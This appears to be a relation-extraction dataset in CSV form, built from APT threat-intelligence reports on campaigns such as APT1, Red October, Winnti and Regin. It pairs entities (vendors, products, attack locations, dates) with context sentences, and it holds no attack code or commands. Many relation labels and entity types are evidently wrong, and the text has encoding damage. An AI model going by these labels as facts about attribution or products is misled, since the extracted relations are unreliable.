"FileName","RelationType","Entity1Mention","Entity1Type","Entity2Mention","Entity2Type","Context"
"fireeye-operation-ke3chang","hasproduct","Microsoft","ORG","Word","PRODUCT","These attacks leveraged older exploits in Adobe PDF Reader ( CVE-2010 - 2883 ) and Microsoft Word ( CVE-2010 - 3333 ) . "
"hidden_lynx","hasattacklocation","VOHO","ORG","China","GPE","This Trojan was leveraged for a special operation during the VOHO campaign and is probably used by a specific team of highly skilled attackers within the group . This Trojan was also found as part of ¡ ° Operation Aurora¡± in 2009 . Much of the attack infrastructure and tools used during these campaigns originate from network infrastructure in China . "
"securelist.com-Red October Detailed Malware Description 2 Second Stage of Attack","hasproduct","Mozilla","ORG","Firefox","PRODUCT","Chrome , Mozilla Firefox , Internet Explorer , Opera 1 . Chrome history : Before the malware is performing the SQL queries on the browsers profile - files , it copies the original file into a temp - file . "
"w64_regin_stage_1","hasproduct","Microsoft","ORG","Windows","PRODUCT","The DLL exports 16 functions , which are simply forwarders for functions exported by wshtcpip.dll , a standard component of Microsoft Windows . "
"securelist.com-Red October Detailed Malware Description 1 First Stage of Attack","hasproduct","Microsoft","ORG","Excel","PRODUCT","Security : None FileType : XLS Software : Microsoft Excel "
"securelist.com-Red October Diplomatic Cyber Attacks Investigation","hasproduct","Microsoft","ORG","Excel","PRODUCT","Importation of exploits : The samples we managed to find were using exploit code for vulnerabilities in Microsoft Word and Microsoft Excel that were created by other attackers and employed during different cyber attacks . "
"icefog","hasproduct","Microsoft","ORG","Windows","PRODUCT","Versions of this backdoor are available for Microsoft Windows and Mac OS X. "
"fireeye-operation-ke3chang","hasattacklocation","Ke3chang CnC","ORG","China","GPE","In addition , the Ke3chang CnC control panel contains a mix of Chinese and English words and characters . The subset of CnC servers that were not hosted by dynamic DNS infrastructure was registered using a registrar in China ( XIN NET ) and the WHOIS records indicate that the registrant is in China . "
"winnti-more-than-just-a-game-130410","hasproduct","Microsoft","ORG","Windows","PRODUCT","This file is a Microsoft Windows native application , which is loaded as a driver and had a valid digital signature in 2012 . "
"The_Uroburos_case","hasproduct","Microsoft","ORG","Windows","PRODUCT","The two files are Microsoft Windows dynamic libraries . "
"securelist.com-Red October Detailed Malware Description 5 Second Stage of Attack","hasproduct","Windows Mobile","ORG","Windows","PRODUCT","All the values and fields in this XML ( it is stored inside file ) are the same as in Windows Mobile module for Windows . "
"2013-9","hasattacklocation","Clausewitz","PERSON","China","GPE","While these incidents do not qualify as warfare by the Clausewitz definition , they are a form of conflict . Cyber Espionage : There is significant evidence of protracted , insidious espionage carried out by a state actor within the cyber realm . China has likely launch hundreds of cyber attacks against the oil and gas industry since as early as 2002 . "
"securelist.com-Red October Detailed Malware Description 4 Second Stage of Attack","hasproduct","Microsoft","ORG","Windows 2000","PRODUCT","If the attacker connects to Microsoft Windows 2000 Server - based system through a null session , it is possible to use the Llsrpc named pipe to add or to delete licenses , and to create new license groups . "
"securelist.com-Red October Detailed Malware Description 4 Second Stage of Attack","hasproduct","Adobe","ORG","Reader","PRODUCT","The module retrieves the Adobe Reader installation path by reading the registry value : HKLMSOFTWAREClassesSoftwareAdobeAcrobatExe@default Then , it tries to identify the version of installed software by searching for strings ¡ ° 10.0¡± , ¡ ° 9.0¡± , ¡ ° 8.0¡± in the installation path . "
"Operation_Molerats","hasattacklocation","Molerats","PERSON","China","GPE","We do not know whether using PIVY is an attempt by those behind the Molerats campaign to frame China-.based threat actors for their attacks or simply evidence that they have added another effective , publicly-.available RAT to its arsenal . But this development should raise a warning flag for anyone tempted to automatically attribute all PIVY attacks to threat actors based in China . "
"icefog","hasproduct","Microsoft Office","ORG","Excel","PRODUCT","The first two vulnerabilities are exploited through Microsoft Office documents ( Word and Excel ) that drop and execute the backdoor and show a fake ¡ ° lure¡± document to the victim . "
"securelist.com-Red October Detailed Malware Description 1 First Stage of Attack","hasproduct","Microsoft","ORG","Visual Studio 2008","PRODUCT","The dropper module is a PE EXE file , compiled with Microsoft Visual Studio 2008 . "
"Safe-a-targeted-threat","hasproduct","Microsoft","ORG","Sysinternals","PRODUCT","A Microsoft Sysinternals tool that allows you to monitor debug outputs on your local system . "
"RAP002_APT1_Technical_backstage.1.0","hasattacklocation","Poison Ivy","ORG","China","GPE","In the report , Mandiant explains that the attackers were using a well - known Remote Administration Tool ( RAT ) called Poison Ivy and that they were located in China . "
"winnti-more-than-just-a-game-130410","hasattacklocation","Winnti","NORP","China","GPE","we can say that at least 35 companies were infected by the Winnti malware at some time . Countries where the affected companies are located : Asia Europe South America North America China "
"securelist.com-Red October Detailed Malware Description 4 Second Stage of Attack","hasproduct","Acrobat Reader","ORG","Microsoft Office","PRODUCT","DocBackdoor ( Acrobat Reader and Microsoft Office plugin ) module Known file locations : add - on directories of Acrobat Reader or Microsoft Office , depends on installation settings . "
"welivesecurity.com-Targeted information stealing attacks in South Asia use email signed binaries","hasattacklocation","Norman","PERSON","Pakistan","GPE","[ Update : Norman released a comprehensive white paper profiling the group behind these attacks ] In the past few months , we have analyzed a targeted campaign that tries to steal sensitive information from different organizations throughout the world , but particularly in Pakistan . "
"rpt-china-chopper","hasproduct","China Chopper","ORG","Linux","PRODUCT","China Chopper can also run transparently on both Windows and Linux . This OS and application flexibility make China Chopper an even more dangerous Web shell . "
"Mandiant_APT1_Report","hasproduct","Samsung","ORG","Galaxy Tab","PRODUCT","These include Apple¡¯s iPad , Samsung¡¯s Galaxy Tab , and Microsoft¡¯s Surface . "
"ByeBye_Shell_target","hasproduct","Microsoft","ORG","Windows","PRODUCT","The samples are also signed with an invalid Microsoft Windows certificate , which can be used for further fingerprinting : 01 . "
"wp-fakem-rat","hasproduct","Twitter","ORG","Windows Messenger","PRODUCT","The network traffic the malware produces is designed to look like Windows Messenger traffic . Malware of this type were discussed on Twitter , noted by SonicWALL , and found to have been active as far back as September 2009.7 However , it remains unclear if all the attacks that used this malware were connected . "
"securelist.com-Red October Detailed Malware Description 2 Second Stage of Attack","hasproduct","MS Outlook","ORG","Windows","PRODUCT","Password This group of modules is designed to steal credentials from various applications and resources , from Mail.ru Agent ( popupal free app from mail.ru ) to MS Outlook credentials and Windows account hashes ( including cached Windows Domain account hashes ) . "
"hidden_lynx","hasattacklocation","VeryCD.com","ORG","China","GPE","A Trojanized software update Since November 2011 , the Hidden Lynx group has been able to insert Moudoor into the distribution chain of one of the most popular Chinese P2P applications provided by VeryCD.com . There is a very low distribution of Trojanized updates and it is quite likely that they are somehow selectively installing Moudoor on specific clients . This is , without a doubt , the longest running distribution vector for the group , which infected victims predominantly in China , the United States and Hong Kong . "
"w64_regin_stage_1","hasproduct","Microsoft","ORG","Windows","PRODUCT","Keeping in mind the what was said about sample ’s exports in section 3.1 , it is even more likely that with the digital signature they were trying to camouflage the sample as a legitimate Microsoft Windows system file . "
"fireeye-poison-ivy-report","hasproduct","FireEye","ORG","ChopShop","PRODUCT","To use the FireEye ChopShop module , you must install CamCrypt , a python wrapper for an open - source implementation of the Camellia encryption library.16 "
"icefog","hasproduct","Microsoft","ORG","Windows","PRODUCT","It is designed to communicate directly with a command - and - control software that runs on Microsoft Windows computers . "
"fireeye-china-chopper-report","hasproduct","China Chopper","ORG","Windows","PRODUCT","China Chopper can also run transparently on both Windows and Linux . This OS and application flexibility make China Chopper an even more dangerous Web shell . "
"Mandiant_APT1_Report","hasproduct","Google","ORG","App Engine","PRODUCT","In addition to dynamic DNS , recently we have observed that APT1 has been creating FQDNs that end with ¡ ° appspot.com¡± , suggesting that they are using Google¡¯s App Engine service . "
"hidden_lynx","hasattacklocation","VeryCD.com","ORG","the United States","GPE","A Trojanized software update Since November 2011 , the Hidden Lynx group has been able to insert Moudoor into the distribution chain of one of the most popular Chinese P2P applications provided by VeryCD.com . There is a very low distribution of Trojanized updates and it is quite likely that they are somehow selectively installing Moudoor on specific clients . This is , without a doubt , the longest running distribution vector for the group , which infected victims predominantly in China , the United States and Hong Kong . "
"welivesecurity.com-Targeted information stealing attacks in South Asia use email signed binaries","hasproduct","Microsoft","ORG","Word","PRODUCT","The other infection vector we found used PE files disguised as Microsoft Word or PDF documents , most likely distributed through email . "
"fireeye-malware-supply-chain","hasattacktime","Piping","ORG","December 19, 2012","DATE","We identified four different samples linked to the Piping campaign . These samples were detected as Trojan . APT.PoisonIvy and Trojan . APT.9002 . The Piping linked samples had compile timestamps between December 19 , 2012 and January 2 , 2013 . "
"securelist.com-Red October Diplomatic Cyber Attacks Investigation","hasproduct","Microsoft","ORG","Word","PRODUCT","Importation of exploits : The samples we managed to find were using exploit code for vulnerabilities in Microsoft Word and Microsoft Excel that were created by other attackers and employed during different cyber attacks . "
"winnti-more-than-just-a-game-130410","hasattacklocation","C&C","ORG","China","GPE","Judging by the information that we have at our disposal . namely the tags within malicious programs , the names of the C&C domains , the companies whose digital certificates were stolen to sign malware , and the countries where detection notifications came from . we can say that at least 35 companies were infected by the Winnti malware at some time . Countries where the affected companies are located : Asia Europe South America North America China "
"The_Epic_Turla_Operation","targets","Turla","PERSON","the Epic Turla","PRODUCT","One big unknown was the infection vector for Turla ( aka Snake or Uroburos ) . Our analysis indicates that victims are infected via a sophisticated multi - stage attack , which begins with the Epic Turla . "
"w64_regin_stage_1","hasproduct","Microsoft","ORG","Windows","PRODUCT","The sample is designed to retrieve , map and execute a payload from a previously infected system ; the payload is a PE32 + DLL for Microsoft Windows . "
"rpt-china-chopper","hasproduct","MySQL","ORG","Windows","PRODUCT","Here , the contents of the PHP version are just as minimalistic .. While the available options differ depending on what platform China Chopper is running on , the file management features in Linux ( see Figure 20 ) are similar to those in Windows . The database client example shown in Figure 21 is MySQL instead of MS - SQL , but it offers many of the same capabilities . "
"winnti-more-than-just-a-game-130410","hasproduct","Adobe","ORG","3D","PRODUCT","The JavaScript code inside the PDF was used to process an interactive form inside the PDF and support dynamic interactive 3D model embedded in the document using Adobe 3D technology . "
"15-2013-youonlyclicktwice","hasattacktime","Ethiopian","NORP","September of last year","DATE","This further validates our scanning results , and calls into question Gamma¡¯s claim that such servers are ¡ ° not ÿ from the FinFisher product line.¡±10 Similarities between the Ethiopian sample and those used to target Bahraini activists also bring into question Gamma International¡¯s earlier claims that the Bahrain samples were stolen demonstration copies . While the sale of such intrusion and surveillance software is largely unregulated , the issue has drawn increased high - level scrutiny . In September of last year , the German foreign minister , Guido Westerwelle , called for an EU - wide ban on the export of such surveillance software to totalitarian states.11 In a December 2012 interview , Marietje Schaake ( MEP ) , currently the rapporteur for the first EU strategy on digital freedom in foreign policy , stated that it was ¡ ° quite shocking¡± that Europe companies continue to export repressive technologies to countries where the rule of law is in question.12 "
"w64_regin_stage_1","hasproduct","Microsoft","ORG","Windows","PRODUCT","An examination of the static properties of the file reveals that the file is a 64 - bit Dynamic Link Library for the Microsoft Windows operating system . "
"The_Epic_Turla_Operation","hasproduct","Adobe","ORG","PDF","PRODUCT","The attacks in this campaign fall into several different categories depending on the vector used in the initial compromise : Spearphishing e - mails with Adobe PDF exploits ( CVE-2013 - 3346 + CVE-2013 - 5065 ) Social engineering to trick the user into running malware installers with "" .SCR "" extension , sometimes packed with RAR Watering hole attacks using Java exploits ( CVE-2012 - 1723 ) , Flash exploits ( unknown ) or Internet Explorer 6,7,8 exploits ( unknown ) "
"Inside_Report_by_Infosec_Consortium","hasattacklocation","APT","ORG","India","GPE","The next part of this research paper focuses on a recent APT campaign against multiple countries including India was targeted . While each and every technical cause for weak Indian Cyber space is beyond the scope of this document , we also believe that India requires a strong policy driven approach along with inspiring leadership from thought leaders and Government departments in Information security to bring the much needed change . "
"securelist.com-Red October Detailed Malware Description 2 Second Stage of Attack","hasproduct","Chrome","ORG","Internet Explorer","PRODUCT","Chrome , Mozilla Firefox , Internet Explorer , Opera 1 . Chrome history : Before the malware is performing the SQL queries on the browsers profile - files , it copies the original file into a temp - file . "
"securelist.com-Red October Detailed Malware Description 5 Second Stage of Attack","hasproduct","CONAGetDeviceCount","ORG","API","PRODUCT","The module uses CONARefreshDeviceList , CONASetDeviceListOption , CONAGetDeviceCount , CONAGetDevices and CONAGetDevice API functions to obtain a device which will be manipulated . "
"Safe-a-targeted-threat","hasproduct","TypeConfig","ORG","GUI","PRODUCT","The fields in the TypeConfig GUI allow an attacker to specify a C&C server location and data like the malware¡¯s name and version number , which are sent back to the attacker after a compromise . "
"winnti-more-than-just-a-game-130410","hasattacklocation","C&C","ORG","India","GPE","Judging by the information that we have at our disposal . namely the tags within malicious programs , the names of the C&C domains , the companies whose digital certificates were stolen to sign malware , and the countries where detection notifications came from . we can say that at least 35 companies were infected by the Winnti malware at some time . Countries where the affected companies are located : Asia Europe South America North America China India Indonesia Japan "
"Inside_Report_by_Infosec_Consortium","hasattacklocation","APT","ORG","India","GPE","The focus of an APT campaign usually is to gather valuable information against specific companies / organizations or selected sectors of a country . These usually begin with highly targeted spear - phishing attacks . Malware Distribution in India "
"fireeye-operation-ke3chang","hasattacklocation","Ke3chang","ORG","China","GPE","The output indicates that the Ke3chang attackers are testing their malware in Windows operating systems , with the default language set to Chinese . Based on this circumstantial evidence we believe that the Ke3chang attackers are operating within China . "
"rpt-china-chopper","hasproduct","China Chopper","ORG","Windows","PRODUCT","China Chopper can also run transparently on both Windows and Linux . This OS and application flexibility make China Chopper an even more dangerous Web shell . "
"1401223631603288","hasattacklocation","Baidu","ORG","China","GPE","Baidu is the largest portal site in China . "
"Mandiant_APT1_Report","hasattacklocation","Rodney","PERSON","Philippines","GPE","We have also observed DOTA using the names Rodney and Raith to communicate via email in fluent English Dota : a harry ¡ ° Poter¡± fan ? with various targets including South East Asian military The DOTA persona also appears to be a organizations in Malaysia and the Philippines . "
"Operation_EphemeralHydra","hasproduct","FireEye","ORG","Dynamic Threat Intelligence","PRODUCT","Through the FireEye Dynamic Threat Intelligence ( DTI ) cloud , we were able to retrieve the payload dropped in the attack . "
"sophos-rotten-tomato-campaign","hasproduct","Microsoft","ORG","Word","PRODUCT","One of the most typical cases is the Tomato Garden case,1 where several different groups used the same zero - day Microsoft Word exploit . "
"fireeye-operation-ke3chang","hasattacklocation","Prince Charming","PERSON","Beijing","GPE","The days are over when spies had to be both a black belt and Prince Charming in the same scene . Today , the vast majority of intelligence collection is conducted through signals intelligence . The ubiquity and vulnerability of the Internet have opened windows into the affairs of Washington , Beijing , and Moscow to a degree that Bond author , Ian Fleming , would never have imagined . "
"1401223631603288","hasattacklocation","ASDE","ORG","South Korea","GPE","A - FIRST from AhnLab has done a forensics analysis using the ASDE ( AhnLab Smart Defense Enterprise ) network and on the damaged company for years . According to the study , ETSO is different from other attackers in following ways : - ETSO analyzes the update structure of a product popularly used in South Korea , in order to distribute malicious codes through reliable products and ultimately , the company . "
"Inside_Report_by_Infosec_Consortium","hasattacklocation","NTRO","ORG","India","GPE","The National Security Database project has been generously endorsed and supported by NTRO and CERT and has been playing an important role in raising the cyber safety awareness across the Nation as well as engaging the community in improving the overall cyber space of India . "
"hidden_lynx","hasattacklocation","VeryCD.com","ORG","Hong Kong","GPE","A Trojanized software update Since November 2011 , the Hidden Lynx group has been able to insert Moudoor into the distribution chain of one of the most popular Chinese P2P applications provided by VeryCD.com . There is a very low distribution of Trojanized updates and it is quite likely that they are somehow selectively installing Moudoor on specific clients . This is , without a doubt , the longest running distribution vector for the group , which infected victims predominantly in China , the United States and Hong Kong . "
"Mandiant_APT1_Report","hasattacklocation","Rodney","PERSON","Malaysia","GPE","We have also observed DOTA using the names Rodney and Raith to communicate via email in fluent English Dota : a harry ¡ ° Poter¡± fan ? with various targets including South East Asian military The DOTA persona also appears to be a organizations in Malaysia and the Philippines . "
"crowdstrike-deep-panda-report","hasproduct","Microsoft","ORG","PatchGuard","PRODUCT","This is one of the simplest ways to do a system call hook , but will not work on 64 - bit Windows as this variable is not exported in addition to the protection provided by Microsoft PatchGuard . "
"icefog","hasproduct","Microsoft","ORG","EMET 4.0","PRODUCT","> Windows users can install Microsoft EMET 4.0 , a toolkit designed to help prevent hackers from gaining access to your system . "
"FireEye-Terminator_RAT","indicates","¡°","PRODUCT","two","CARDINAL","The ¡ ° relay link¡± was created using two threads , where one thread will transfer data from socket 1 to socket 2 ( see Figure 6 ) and the other will do vice versa . "
"Unveiling_an_Indian_Cyberattack_Infrastructure","hasattacklocation","Khalistancalling.com","ORG","India","GPE","Khalistancalling.com has since moved on to another bad IP ( 46.182.104.83 ) and must be considered owned by the attackers . The Nagaland movement The Nagaland ( or Nagalim ) movement is another secessionist group aiming to create a sovereign homeland for the Naga people living in North - Eastern India and North - Western Burma . "
"fireeye-wwc-report","hasattacklocation","$631 million","MONEY","China","GPE","China allegedly stole the blueprints for the Australian Security Intelligence Organization¡¯s new $ 631 million building.17 . Worldwide : In 2009 , Canadian researchers discovered that China controlled a worldwide cyber espionage network in over 100 countries.18 In 2010 , a Chinese telecommunications firm transmitted erroneous routing information for 37,000 computer networks , which misrouted some Internet traffic through China for 20 minutes . "
"welivesecurity.com-Targeted information stealing attacks in South Asia use email signed binaries","hasattacklocation","Norman","PERSON","India","GPE","[ Update : Norman released a comprehensive white paper profiling the group behind these attacks ] In the past few months , we have analyzed a targeted campaign that tries to steal sensitive information from different organizations throughout the world , but particularly in Pakistan . During the course of our investigations we uncovered several leads that indicate this threat has its origin in India and has been going on for at least two years . "
"winnti-more-than-just-a-game-130410","hasattacklocation","C&C","ORG","Indonesia","GPE","Judging by the information that we have at our disposal . namely the tags within malicious programs , the names of the C&C domains , the companies whose digital certificates were stolen to sign malware , and the countries where detection notifications came from . we can say that at least 35 companies were infected by the Winnti malware at some time . Countries where the affected companies are located : Asia Europe South America North America China India Indonesia Japan "
"Securelist_RedOctober","hasproduct","Cisco","ORG","Windows Mobile","PRODUCT","Beside traditional attack targets ( workstations ) , the system is capable of stealing data from mobile devices , such as smartphones ( iPhone , Nokia , Windows Mobile ) ; dumping enterprise network equipment configuration ( Cisco ) ; hijacking files from removable disk drives ( including already deleted files via a custom file recovery procedure ) ; stealing e - mail databases from local Outlook storage or remote POP / IMAP server ; and siphoning files from local network FTP servers . "
"19-2013-acalltoharm","hasproduct","Freegate","ORG","Windows","PRODUCT","In this attack , which we first observed in the second week of June , the potential victim is encouraged to visit a download link containing a malicious installer of Freegate . Freegate is a standalone circumvention - bypassing Virtual Private Network ( VPN ) client for Windows . Legitimate versions of the Freegate software are available for download on its website . "
"2013-9","hasattacktime","billions of dollars","MONEY","February 10","DATE","The article notes that ¡ ° when Venezuela seized billions of dollars in assets from Exxon Mo. 22 U.S. Energy Information Administration . ( 2013 , February 12 ) . International Energy Statistics [ Data file ] . Retrieved from http://www.eia.gov/cfapps/ipdbproject/iedindex3.cfm?tid=5&pid=53&aid=1&cid=CH,&syid=2006&eyid=2012&unit=TBPD 23 Kirk , J. ( 2011 , February 10 ) . "
"winnti-more-than-just-a-game-130410","hasattacklocation","Winnti","NORP","India","GPE","we can say that at least 35 companies were infected by the Winnti malware at some time . Countries where the affected companies are located : Asia Europe South America North America China India Indonesia Japan "
"fireeye-operation-ke3chang","hasattacklocation","Prince Charming","PERSON","Moscow","GPE","The days are over when spies had to be both a black belt and Prince Charming in the same scene . Today , the vast majority of intelligence collection is conducted through signals intelligence . The ubiquity and vulnerability of the Internet have opened windows into the affairs of Washington , Beijing , and Moscow to a degree that Bond author , Ian Fleming , would never have imagined . "
"winnti-more-than-just-a-game-130410","hasproduct","Microsoft","ORG","Windows","PRODUCT","The malicious module turned out to be the first Trojan for the 64 - bit version of Microsoft Windows with valid digital signature that we have seen . "
"rpt-operation-saffron-rose","indicates","the ¡®Stealer Builder¡¯","PRODUCT","two","CARDINAL","The ¡ ° Stealer¡± Builder and Tools During our research , we recovered two different tools used by the members of the Ajax Security Team in conjunction with targeted intrusion activities . The first tool , labeled the ¡ ® Stealer Builder¡¯ was compiled on 2014 - 04 - 08 . "
"securelist.com-Red October Detailed Malware Description 4 Second Stage of Attack","hasproduct","MapMenuConfigGrps","ORG","Windows","PRODUCT","It seems that MapMenuConfigGrps registry value doesn¡¯t exist on standard Windows system . "
"Surtr_Malware_Tibetan","hasproduct","Microsoft","ORG","Word","PRODUCT","Attached to the email were what appeared to be three Microsoft Word documents ( .doc ) , but which were trojaned with a malware family we call ¡ ° Surtr¡±.1 "
"FTA 1008 - Darkseoul-Jokra Analysis and Recovery","indicates","Jokra","PRODUCT","two","CARDINAL","The Windows 7 systems that wereaffected by the two malware samples did not experience these issues , and appeared to operatenormally . Attempts to repair the XP system with the windows recovery CD always ended in a bluescreen error before the operation finished any repairing . The Fidelis Take Fidelis XPS sensors detect the DarkSeoul / Jokra malware as it enters the network as""Trojan . Win32.EraseMBR.b "" . "
"fireeye-malware-supply-chain","hasattacktime","Piping","ORG","January 2, 2013","DATE","We identified four different samples linked to the Piping campaign . These samples were detected as Trojan . APT.PoisonIvy and Trojan . APT.9002 . The Piping linked samples had compile timestamps between December 19 , 2012 and January 2 , 2013 . "
"fireeye-poison-ivy-report","hasproduct","PyCommands","ORG","Python","PRODUCT","PyCommands , meanwhile , are Python scripts that automate tasks for Immunity Debugger , a popular tool for reverse - engineering malware binaries.2 The FireEye PyCommand script dumps configuration information from a running PIVY process on an infected endpoint , which can provide additional telemetry about the threat actor behind the attack . "
"securelist.com-Red October Detailed Malware Description 5 Second Stage of Attack","hasproduct","Microsoft","ORG","Visual Studio 2010","PRODUCT","The file is a PE DLL file with 2 exported functions , compiled with Microsoft Visual Studio 2010 . "
"wp-fakem-rat","hasproduct","Windows. Messenger","ORG","Messenger","PRODUCT","Some variants attempt to disguise network traffic to look like Windows . Messenger and Yahoo ! . Messenger traffic . "
"fireeye-operation-ke3chang","hasattacklocation","Ke3chang","ORG","China","GPE","Based on this circumstantial evidence we believe that the Ke3chang attackers are operating within China . "
"fireeye-wwc-report","hasattacklocation","the ¡°Comment Crew¡±","ORG","Russia","GPE","Home to large , bureaucratic hacker groups such as the ¡ ° Comment Crew¡± who pursue many goals and targets in high - frequency , brute - force attacks . . Russia / Eastern Europe . "
"fireeye-poison-ivy-report","hasproduct","FireEye","ORG","PyCommand","PRODUCT","PyCommands , meanwhile , are Python scripts that automate tasks for Immunity Debugger , a popular tool for reverse - engineering malware binaries.2 The FireEye PyCommand script dumps configuration information from a running PIVY process on an infected endpoint , which can provide additional telemetry about the threat actor behind the attack . "
"The_Epic_Turla_Operation","hasproduct","Microsoft","ORG","Windows XP","PRODUCT","This exploit only works on unpatched Microsoft Windows XP systems . "
"winnti-more-than-just-a-game-130410","hasattacklocation","Winnti","NORP","Indonesia","GPE","we can say that at least 35 companies were infected by the Winnti malware at some time . Countries where the affected companies are located : Asia Europe South America North America China India Indonesia Japan "
"wp-fakem-rat","hasproduct","SonicWALL","ORG","Windows Messenger","PRODUCT","The network traffic the malware produces is designed to look like Windows Messenger traffic . Malware of this type were discussed on Twitter , noted by SonicWALL , and found to have been active as far back as September 2009.7 However , it remains unclear if all the attacks that used this malware were connected . "
"icefog","hasattacklocation","Icefog","ORG","South Korea","GPE",", we believe that the primary targets of the Icefog operations were in South Korea and Japan . "
"winnti-more-than-just-a-game-130410","hasattacklocation","KOG","ORG","South Korea","GPE","As for the people behind these attacks involving this remote administration tool , we ended up calling them ¡ ° the Winnti group¡±. Interestingly , the digital signature belonged to another video game vendor - a private company known as KOG , based in South Korea . "
"w64_regin_stage_1","hasproduct","Microsoft","ORG","Windows","PRODUCT","In this document we describe the inner workings of the stage # 1 of the complex malware threat by the name of Regin , specifically the version targeted at 64 - bit machines running the Microsoft Windows operating system . "
"2013-9","hasattacktime","Clausewitz","PERSON","as early as 2002","DATE","While these incidents do not qualify as warfare by the Clausewitz definition , they are a form of conflict . Cyber Espionage : There is significant evidence of protracted , insidious espionage carried out by a state actor within the cyber realm . China has likely launch hundreds of cyber attacks against the oil and gas industry since as early as 2002 . "
"fireeye-operation-ke3chang","hasattacklocation","Ke3chang CnC","ORG","China","GPE","In addition , the Ke3chang CnC control panel contains a mix of Chinese and English words and characters . The subset of CnC servers that were not hosted by dynamic DNS infrastructure was registered using a registrar in China ( XIN NET ) and the WHOIS records indicate that the registrant is in China . "
"fireeye-malware-supply-chain","hasattacktime","four","CARDINAL","December 19, 2012","DATE","We identified four different samples linked to the Piping campaign . These samples were detected as Trojan . APT.PoisonIvy and Trojan . APT.9002 . The Piping linked samples had compile timestamps between December 19 , 2012 and January 2 , 2013 . "
"winnti-more-than-just-a-game-130410","hasattacklocation","Symantec","ORG","South Korea","GPE","Symantec appears to be the first to name these malicious programs ; we kept Symantec¡¯s name . Winnti . in the name of the malware family we created : Backdoor . Win32(Win64).Winnti . As for the people behind these attacks involving this remote administration tool , we ended up calling them ¡ ° the Winnti group¡±. Interestingly , the digital signature belonged to another video game vendor - a private company known as KOG , based in South Korea . "
"Secrets_of_the_Comfoo_Masters","hasproduct","Comfoo","ORG","DLL","PRODUCT","To maintain persistence on the system , Comfoo usually replaces the path to the DLL of an existing unused service rather than installing a new service . "
"fireeye-poison-ivy-report","hasproduct","Microsoft","ORG","Word","PRODUCT","Weaponization The menuPass campaign has used weaponized Microsoft Word documents ( CVE-2010 - 3333)35 and ZIP files containing executable files to drop PIVY directly onto its targets . "
